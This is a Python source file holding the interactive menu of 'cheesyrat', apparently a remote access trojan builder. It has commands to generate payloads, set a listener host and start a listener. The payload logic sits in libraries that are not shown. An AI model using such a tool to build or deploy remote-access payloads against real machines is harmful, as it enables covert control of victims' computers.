#!/usr/bin/env python3
#coding: utf-8
#written by kyryloren. https://github.com/kyryloren/cheesyrat

import os
import sys
import subprocess
import time
import signal
import webbrowser
import readline
from lib import colors
from lib import autocomplete
from lib import cheesyrat_lib

def complete_menu():
    cheesyrat_lib.clear()
    cheesyrat_lib.banner()
    answ=True
    while answ:
        ans = ""
        completer = autocomplete.Complete(["help", "generate", "listen", "credits", "banner", "clear", "exit", "quit"])
        readline.set_completer(completer.complete)
        readline.parse_and_bind('tab: complete')
        ans = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'menu' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)

        if ans.lower() == "help":
            cheesyrat_lib.main_menu_help()
        elif ans == "?":
            cheesyrat_lib.main_menu_help()
        elif ans.lower() == "generate":
            generate_menu()
        elif ans.lower() == "listen":
            print("load listener")
        elif ans.lower() == "credits":
            cheesyrat_lib.clear()
            cheesyrat_lib.credits()
            back = input(colors.GREEN + colors.BOLD + '\n\nPress [ENTER] to return to menu' + colors.END)
            cheesyrat_lib.clear()
            cheesyrat_lib.banner()
        elif ans.lower() == "banner":
            cheesyrat_lib.banner()
        elif ans.lower() == "clear":
            cheesyrat_lib.clear()
        elif ans.lower() == "exit":
            cheesyrat_lib.exit_function()
        elif ans.lower() == "quit":
            cheesyrat_lib.exit_function()
        else:
            cheesyrat_lib.warning_message("Invalid command.")

def generate_menu():
    while True:
        completer = autocomplete.Complete(["help", "clear", "back", "exit", "quit", "options", "set"])
        readline.set_completer(completer.complete)
        readline.parse_and_bind('tab: complete')
        cmd = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'main/generate' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
        if cmd.lower() == "help":
            cheesyrat_lib.generate_menu_help()
        elif cmd.lower() == "?":
            cheesyrat_lib.generate_menu_help()
        elif cmd.lower() == "options":
            cheesyrat_lib.payload_options()
        elif cmd.lower()[0:9] == "set lhost":
            lhost = cmd[10:]
            cheesyrat_lib.update_json("lhost", lhost, cheesyrat_lib.get_config_json_file())
            print("lhost => " + lhost)
        elif cmd.lower() == "clear":
            cheesyrat_lib.clear()
        elif cmd.lower() == "back":
            break
        elif cmd.lower() == "exit":
            cheesyrat_lib.exit_function()
        elif cmd.lower() == "quit":
            cheesyrat_lib.exit_function()
        else:
            cheesyrat_lib.warning_message("Invalid command.")


if __name__ == "__main__":
    complete_menu()
